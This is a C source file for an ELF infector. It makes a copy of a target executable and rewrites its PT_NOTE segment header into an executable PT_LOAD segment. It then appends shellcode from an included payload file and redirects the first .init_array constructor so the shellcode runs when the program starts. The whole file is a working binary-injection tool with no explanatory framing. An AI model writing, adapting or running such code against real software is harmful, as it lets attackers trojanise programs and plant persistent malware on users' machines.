#include <elf.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <limits.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define SHELLCODE_VADDR (0xc00000 + fd_sz)

#include "payload.c"

int make_inject_copy(const char *filename) {
	char buffer[4096];
	char new_filename[PATH_MAX];

	snprintf(new_filename, PATH_MAX, "%s_injected", filename);

	int from = open(filename, O_RDONLY);
	if (from == -1) {
		perror("Could not open original file");
		exit(1);
	}
	int to = open(new_filename, O_RDWR|O_CREAT);
	if (to == -1) {
		perror("Could not open copy file");
		exit(1);
	}
	fchmod(to, 0755);

	size_t read_sz;
	while ((read_sz = read(from, buffer, sizeof(buffer)))) {
		write(to, buffer, read_sz);
	}

	close(from);

	return to;
}

int main(int argc, char *argv[])
{
	if (argc != 2) {
		fprintf(stderr, "Usage: %s <filename>\n", argv[0]);
		exit(1);
	}

	int fd = make_inject_copy(argv[1]);
	size_t fd_sz;
	Elf64_Off shellcode_offset = fd_sz = lseek(fd, 0, SEEK_END);
	lseek(fd, 0, SEEK_SET);

	char *elf = mmap(NULL, fd_sz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (!elf) {
		perror("Could not map file to memory");
		exit(1);
	}

	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)elf;
	Elf64_Phdr *phdr = (Elf64_Phdr *)(elf + ehdr->e_phoff);
	Elf64_Shdr *shdr = (Elf64_Shdr *)(elf + ehdr->e_shoff);

	int phidx;
	for (phidx = 0; phidx < ehdr->e_phnum; phidx++) {
		Elf64_Phdr *current_phdr = &phdr[phidx];
		if (current_phdr->p_type == PT_NOTE) {
			current_phdr->p_type = PT_LOAD;
			current_phdr->p_flags = PF_R | PF_X;
			current_phdr->p_offset = shellcode_offset;
			current_phdr->p_vaddr = SHELLCODE_VADDR;
			current_phdr->p_paddr = SHELLCODE_VADDR;
			current_phdr->p_filesz = shellcode_len;
			current_phdr->p_memsz = shellcode_len;

			break;
		}
	}

	if (phidx == ehdr->e_phnum) {
		perror("Could not find a PT_NOTE segment header\n");
		exit(1);
	}

	int shidx;
	for (shidx = 0; shidx < ehdr->e_shnum; shidx++) {
		Elf64_Shdr *current_shdr = &shdr[shidx];
		if (current_shdr->sh_type == SHT_INIT_ARRAY) {
			unsigned long *init_array = (unsigned long *)(elf + current_shdr->sh_offset);

			*(unsigned long *)(shellcode + shellcode_len - 4) = init_array[0] - (SHELLCODE_VADDR + shellcode_len);
			init_array[0] = SHELLCODE_VADDR;

			break;
		}
	}

	if (shidx == ehdr->e_shnum) {
		perror("Could not find an .init_array section header\n");
		exit(1);
	}

	munmap(elf, fd_sz);

	lseek(fd, 0, SEEK_END);
	write(fd, shellcode, shellcode_len);

	close(fd);
}
